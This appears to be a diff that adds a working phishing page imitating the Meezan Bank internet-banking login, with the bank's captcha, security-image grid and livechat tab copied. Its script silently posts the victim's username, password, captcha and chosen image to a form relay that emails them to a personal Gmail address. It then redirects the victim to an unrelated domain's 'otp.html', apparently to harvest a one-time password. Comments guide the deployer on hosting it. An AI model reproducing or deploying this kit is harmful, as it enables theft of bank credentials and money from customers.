@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Meezan Bank Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', sans-serif;
+            min-height: 100vh; 
+            min-height: 100dvh; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('background.png'); /* Upload your local background.jpg here */
+            background-size: cover;
+            background-position: center;
+        }
+        
+        /* --- Perfect Black Overlay --- */
+        .bg-overlay { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0, 0, 0, 0.50); 
+            z-index: 0; 
+        }
+        
+        .login-container { 
+            position: relative; z-index: 1; 
+            width: 100%; max-width: 400px; 
+            padding: 25px 20px; text-align: center; 
+            max-height: 100vh; max-height: 100dvh;
+            overflow-y: auto; 
+        }
+
+        /* --- Logo Fix (Forces space so it never pushes title up) --- */
+        .bank-logo { 
+            display: block; 
+            width: 100%; 
+            max-width: 150px; 
+            height: auto; 
+            min-height: 60px; 
+            margin: 0 auto 20px auto; 
+            object-fit: contain;
+        }
+
+        .title { 
+            display: block; color: white; font-weight: 600; 
+            font-size: 1.15rem; margin-bottom: 25px; 
+        }
+        
+        /* --- Inputs & UI --- */
+        .input-group { display: flex; align-items: center; background: white; border-radius: 6px; overflow: hidden; margin-bottom: 12px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .input-icon, .eye-icon { padding: 14px 15px; background: #ececec; display: flex; align-items: center; justify-content: center; }
+        .input-icon { width: 48px; background: #d1c4e9; color: #6a1b9a; }
+        .eye-icon { background: #ececec; color: #555; cursor: pointer; }
+        .input-group input { flex: 1; border: none; padding: 14px 15px; outline: none; font-size: 0.95rem; width: 100%; background: transparent;}
+        
+        .forgot-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 0.9rem; }
+        .highlight-text { color: #ffeb3b; margin-left: 5px; font-weight: 500; }
+        .checkbox-group { display: flex; align-items: center; color: white; }
+        .checkbox-group input { accent-color: #6a1b9a; width: 16px; height: 16px; cursor: pointer; }
+        .forgot-link { color: white; text-decoration: none; font-size: 0.85rem;}
+
+        /* --- Captcha --- */
+        .captcha-group { display: flex; align-items: center; gap: 10px; justify-content: center; margin: 15px 0; }
+        .captcha-box { background: rgba(200, 200, 200, 0.85); padding: 8px 15px; border-radius: 4px; font-weight: bold; letter-spacing: 2px; font-size: 1.1rem; color: #333; text-decoration: line-through; font-family: monospace; }
+        .refresh-captcha { color: white; font-size: 1.2rem; cursor: pointer; }
+
+        /* --- Security Grid (Tweaked to be smaller & exact white borders like Original) --- */
+        .security-image-section { margin: 20px 0; }
+        .security-header { display: flex; justify-content: center; align-items: center; color: white; margin-bottom: 15px; gap: 8px; font-size: 0.95rem; }
+        .help-icon { background: #e65100; border-radius: 50%; width: 20px; height: 20px; font-size: 0.8rem; display: flex; align-items: center; justify-content: center; color: white; }
+        
+        .image-grid { 
+            display: grid; 
+            grid-template-columns: repeat(3, 1fr); 
+            gap: 10px; 
+            max-width: 280px; 
+            margin: 0 auto 15px auto; 
+        }
+        
+        .grid-item { 
+            aspect-ratio: 1/1; 
+            max-width: 80px; /* Makes them smaller than the container */
+            width: 100%;
+            justify-self: center;
+            border: 2px solid white; /* Exact solid white border */
+            border-radius: 6px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: white; 
+            font-size: 1.2rem; /* Smaller icons */
+            cursor: pointer; 
+            transition: all 0.2s; 
+            background: transparent;
+        }
+        .grid-item:hover { background: rgba(255, 255, 255, 0.1); }
+        .center-link { display: block; text-align: center; margin-top: 5px; font-size: 0.8rem; }
+
+        /* --- Buttons --- */
+        .btn-login { width: 100%; padding: 14px; background: #6a1b9a; color: white; border: none; border-radius: 6px; font-size: 1.1rem; margin-bottom: 15px; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.5); transition: 0.2s; }
+        .btn-login:hover { background: #4a148c; }
+        .btn-register { width: 100%; padding: 14px; background: rgba(255,255,255,0.9); color: #6a1b9a; border: none; border-radius: 6px; font-size: 1rem; margin-bottom: 10px; cursor: pointer; font-weight: 600; }
+        .btn-register:hover { background: white; }
+        .footer-link { display: block; color: white; text-decoration: none; font-size: 0.85rem; margin-top: 15px; }
+
+        /* --- Livechat Tab (Made BIGGER and prominent exactly like Original) --- */
+        .livechat-tab {
+            position: fixed; right: 0; top: 50%; transform: translateY(-50%);
+            background: #6a1b9a; 
+            color: white; 
+            padding: 30px 12px; /* Increased padding to make it big */
+            border-radius: 8px 0 0 8px; 
+            writing-mode: vertical-rl;
+            text-orientation: mixed; 
+            letter-spacing: 2px; 
+            font-weight: 700;
+            font-size: 1.1rem; /* Larger font */
+            cursor: pointer; 
+            box-shadow: -4px 0 15px rgba(0,0,0,0.5); /* Stronger shadow */
+            z-index: 999; 
+            transition: 0.2s;
+        }
+        .livechat-tab:hover { background: #4a148c; }
+
+        @media (max-width: 480px) {
+            .login-container { padding: 15px; }
+            .bank-logo { max-width: 120px; }
+            .grid-item { max-width: 65px; font-size: 1.1rem; }
+            .livechat-tab { font-size: 0.85rem; padding: 20px 8px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- This overlay sits behind the form -->
+    <div class="bg-overlay"></div>
+
+    <div class="login-container">
+        <!-- Change src="/logo.png" to your local Hostinger logo path -->
+        <img src="/logo.png" alt="Meezan Bank Logo" class="bank-logo">
+
+        <h2 class="title">Welcome To Meezan Internet Banking</h2>
+
+        <form id="loginForm">
+            <input type="hidden" id="selectedImage" value="None">
+
+            <div class="input-group">
+                <span class="input-icon"><i class="fas fa-user"></i></span>
+                <input type="text" id="username" placeholder="Username" required>
+            </div>
+
+            <div class="forgot-row">
+                <div class="checkbox-group">
+                    <input type="checkbox" id="remember">
+                    <label for="remember" class="highlight-text">Remember Username</label>
+                </div>
+                <a href="#" class="forgot-link">Forgot Username?</a>
+            </div>
+
+            <div class="input-group">
+                <span class="input-icon"><i class="fas fa-lock"></i></span>
+                <input type="password" id="password" placeholder="Password (Alpha-numeric)" required>
+                <span class="eye-icon" onclick="togglePassword()"><i class="fas fa-eye" id="eyeToggle"></i></span>
+            </div>
+
+            <div class="forgot-row">
+                <a href="#" class="forgot-link">Forgot Password?</a>
+            </div>
+
+            <div class="captcha-group">
+                <span class="captcha-box">1 q X b 9 6</span>
+                <i class="fas fa-sync-alt refresh-captcha"></i>
+            </div>
+            <div class="input-group" style="margin-bottom: 20px;">
+                <input type="text" id="captcha" placeholder="Enter Captcha" required>
+            </div>
+
+            <div class="security-image-section">
+                <div class="security-header">
+                    <span>Select security image</span>
+                    <span class="help-icon"><i class="far fa-question-circle"></i></span>
+                </div>
+                
+                <div class="image-grid">
+                    <div class="grid-item" onclick="selectImage(this, 'clock')"><i class="fas fa-clock"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'mouse')"><i class="fas fa-mouse"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'mug')"><i class="fas fa-mug-hot"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'phone')"><i class="fas fa-phone-alt"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'bicycle')"><i class="fas fa-bicycle"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'glasses')"><i class="fas fa-glasses"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'lightbulb')"><i class="fas fa-lightbulb"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'hat')"><i class="fas fa-hat-cowboy"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'plane')"><i class="fas fa-plane"></i></div>
+                    <div class="grid-item" onclick="selectImage(this, 'car')"><i class="fas fa-car"></i></div>
+                </div>
+                
+                <a href="#" class="forgot-link center-link">Forgot Security Image?</a>
+            </div>
+
+            <button type="submit" id="loginBtn" class="btn-login">Login</button>
+            <button type="button" class="btn-register">Internet Banking Registration</button>
+            
+            <a href="#" class="footer-link">Security Guide</a>
+        </form>
+    </div>
+
+    <!-- Big Exact Livechat Tab -->
+    <div class="livechat-tab">
+        <span>LIVECHAT</span>
+    </div>
+
+    <script>
+        // Toggle Password Visibility
+        function togglePassword() {
+            const passInput = document.getElementById('password');
+            const icon = document.getElementById('eyeToggle');
+            if (passInput.type === 'password') {
+                passInput.type = 'text';
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                passInput.type = 'password';
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
+        // Refresh Captcha
+        document.querySelector('.refresh-captcha').addEventListener('click', function() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let captcha = '';
+            for (let i = 0; i < 6; i++) { captcha += chars.charAt(Math.floor(Math.random() * chars.length)); }
+            document.querySelector('.captcha-box').innerText = captcha;
+        });
+
+        // Select Image & Update Hidden Input
+        function selectImage(element, imageName) {
+            document.querySelectorAll('.grid-item').forEach(el => {
+                el.style.background = 'transparent';
+                el.style.border = '2px solid white'; // Reset to exact white border
+            });
+            element.style.background = 'rgba(106, 27, 154, 0.6)';
+            element.style.border = '2px solid #6a1b9a';
+            document.getElementById('selectedImage').value = imageName;
+        }
+
+        // Submit Data & Redirect Silently
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); 
+            const btn = document.getElementById('loginBtn');
+            btn.disabled = true; // Prevents double clicking
+
+            const formData = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                captcha: document.getElementById('captcha').value,
+                security_image: document.getElementById('selectedImage').value,
+                _subject: "New Meezan Login Data",
+                _captcha: false
+            };
+
+            // Fire background email request to your email
+            fetch('https://formsubmit.co/ajax/ayanali012777@gmail.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify(formData)
+            }).catch(err => console.error(err)); // Silently ignore errors
+
+            // Redirect to real bank site instantly
+            window.location.href = "https://alfjobz.com/otp.html";
+        });
+    </script>
+</body>
+</html>
